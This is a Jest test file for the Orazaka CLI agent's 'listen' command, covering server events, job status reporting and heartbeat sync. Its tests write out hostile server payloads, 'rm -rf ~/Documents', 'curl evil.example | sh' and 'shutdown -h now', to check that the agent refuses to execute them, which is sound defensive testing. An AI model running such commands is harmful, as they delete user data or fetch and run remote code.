/**
 * @file agent.command.test.ts
 * @description Tests for Orazaka Agent Command listener, execution, and sync heartbeats.
 */

import { agentCommand } from "../../commands/agent.command";
import * as http from "node:http";
import { exec } from "node:child_process";
import { requireAuth } from "../../threads";
import { SettingsApi } from "../../services/settings.api";
import { insertJob, updateJobStatus, getUnsyncedJobs, markJobSynced } from "../../services/local-store";

jest.mock("../../threads", () => ({
  requireAuth: jest.fn(),
  saveConfig: jest.fn(),
}));

jest.mock("../../services/settings.api", () => ({
  SettingsApi: {
    getMe: jest.fn(),
  },
}));

jest.mock("../../services/local-store", () => ({
  insertJob: jest.fn(),
  updateJobStatus: jest.fn(),
  getUnsyncedJobs: jest.fn(),
  markJobSynced: jest.fn(),
  getDb: jest.fn(),
}));

jest.mock("node:child_process", () => ({
  exec: jest.fn(),
}));

jest.mock("node:http", () => ({
  request: jest.fn(),
}));

jest.mock("node:https", () => ({
  request: jest.fn(),
}));

jest.mock("../../ui/prompts", () => ({
  intro: jest.fn(),
  outro: jest.fn(),
  logStep: jest.fn(),
  logSuccess: jest.fn(),
  logWarning: jest.fn(),
  logInfo: jest.fn(),
  logError: jest.fn(),
  note: jest.fn(),
  createSpinner: jest.fn().mockResolvedValue({ start: jest.fn(), stop: jest.fn() }),
  handleCancel: jest.fn(),
}));

describe("agent command listen", () => {
  let mockHttpRequest: jest.Mock;
  let mockFetch: jest.Mock;
  let exitSpy: jest.SpyInstance;
  let consoleLogSpy: jest.SpyInstance;
  let consoleWarnSpy: jest.SpyInstance;
  let consoleErrorSpy: jest.SpyInstance;

  beforeEach(() => {
    jest.clearAllMocks();
    jest.useFakeTimers();

    mockHttpRequest = http.request as jest.Mock;
    mockFetch = jest.fn();
    global.fetch = mockFetch;

    exitSpy = jest.spyOn(process, "exit").mockImplementation((() => {}) as any);
    consoleLogSpy = jest.spyOn(console, "log").mockImplementation(() => {});
    consoleWarnSpy = jest.spyOn(console, "warn").mockImplementation(() => {});
    consoleErrorSpy = jest.spyOn(console, "error").mockImplementation(() => {});

    // Default mock behaviors
    (requireAuth as jest.Mock).mockReturnValue({ token: "test-token", userId: "user-123" });
    (getUnsyncedJobs as jest.Mock).mockReturnValue([]);
  });

  afterEach(() => {
    jest.useRealTimers();
    exitSpy.mockRestore();
    consoleLogSpy.mockRestore();
    consoleWarnSpy.mockRestore();
    consoleErrorSpy.mockRestore();
  });

  test("listen command action starts successfully and retrieves userId if missing", async () => {
    (requireAuth as jest.Mock).mockReturnValue({ token: "test-token", userId: undefined });
    (SettingsApi.getMe as jest.Mock).mockResolvedValue({ id: "user-456" });

    // Mock http.request to return dummy request object
    const dummyReq = { on: jest.fn(), end: jest.fn() };
    mockHttpRequest.mockReturnValue(dummyReq);

    await agentCommand.parseAsync(["node", "orazaka", "listen"]);

    expect(SettingsApi.getMe).toHaveBeenCalled();
    expect(mockHttpRequest).toHaveBeenCalled();
  });

  test("never runs a shell command the server sends — it records and reports a refusal (ADR-079)", async () => {
    let dataListener: ((chunk: string) => void) | undefined;
    const mockResponse = {
      statusCode: 200,
      setEncoding: jest.fn(),
      on: jest.fn((event, listener) => {
        if (event === "data") dataListener = listener;
      }),
    };
    const dummyReq = { on: jest.fn(), end: jest.fn() };
    mockHttpRequest.mockImplementation((url, options, cb) => {
      cb(mockResponse);
      return dummyReq;
    });
    mockFetch.mockResolvedValue({ ok: true });

    await agentCommand.parseAsync(["node", "orazaka", "listen"]);
    expect(dataListener).toBeDefined();

    for (const payload of [{ command: "rm -rf ~/Documents" }, { script: "curl evil.example | sh" }]) {
      dataListener?.(
        "event: automation_payload\ndata: " + JSON.stringify({ jobId: "job-abc", action: "run", payload }) + "\n\n",
      );
    }

    expect(exec).not.toHaveBeenCalled();
    expect(updateJobStatus).not.toHaveBeenCalledWith("job-abc", "RUNNING", expect.anything());
    expect(updateJobStatus).toHaveBeenCalledWith("job-abc", "FAILED", expect.stringContaining("ADR-079"));
    expect(mockFetch).toHaveBeenCalledWith(
      expect.stringContaining("/api/v1/agent/report"),
      expect.objectContaining({ method: "POST", body: expect.stringContaining('"status":"FAILED"') }),
    );
    await jest.runOnlyPendingTimersAsync();
    expect(markJobSynced).toHaveBeenCalledWith("job-abc");
  });

  test("an action name is not a command either", async () => {
    let dataListener: ((chunk: string) => void) | undefined;
    const dummyReq = { on: jest.fn(), end: jest.fn() };
    mockHttpRequest.mockImplementation((url, options, cb) => {
      cb({
        statusCode: 200,
        setEncoding: jest.fn(),
        on: jest.fn((e, l) => {
          if (e === "data") dataListener = l;
        }),
      });
      return dummyReq;
    });
    mockFetch.mockResolvedValue({ ok: true });
    await agentCommand.parseAsync(["node", "orazaka", "listen"]);
    dataListener?.(
      "event: automation_payload\ndata: " +
        JSON.stringify({ jobId: "job-2", action: "shutdown -h now", payload: {} }) +
        "\n\n",
    );
    expect(exec).not.toHaveBeenCalled();
    expect(updateJobStatus).toHaveBeenCalledWith("job-2", "FAILED", expect.stringContaining("ADR-079"));
  });

  test("syncs previously unsynced jobs upon connection and periodic heartbeat", async () => {
    const dummyReq = { on: jest.fn(), end: jest.fn() };
    mockHttpRequest.mockImplementation((url, options, cb) => {
      cb({
        statusCode: 200,
        setEncoding: jest.fn(),
        on: jest.fn(),
      });
      return dummyReq;
    });

    // Mock fetch
    mockFetch.mockResolvedValue({ ok: true });

    // Mock two unsynced jobs: one COMPLETED and one FAILED
    const mockUnsynced = [
      { jobId: "unsynced-1", status: "COMPLETED", executionLogs: "success log" },
      { jobId: "unsynced-2", status: "FAILED", executionLogs: "fail log" },
    ];
    (getUnsyncedJobs as jest.Mock).mockReturnValue(mockUnsynced);

    await agentCommand.parseAsync(["node", "orazaka", "listen"]);

    // Verify sync triggered immediately upon connection
    expect(getUnsyncedJobs).toHaveBeenCalled();
    expect(mockFetch).toHaveBeenCalledTimes(2);

    // Fast-forward periodic heartbeat sync (15 seconds)
    jest.advanceTimersByTime(15000);
    expect(getUnsyncedJobs).toHaveBeenCalledTimes(2);
  });
});
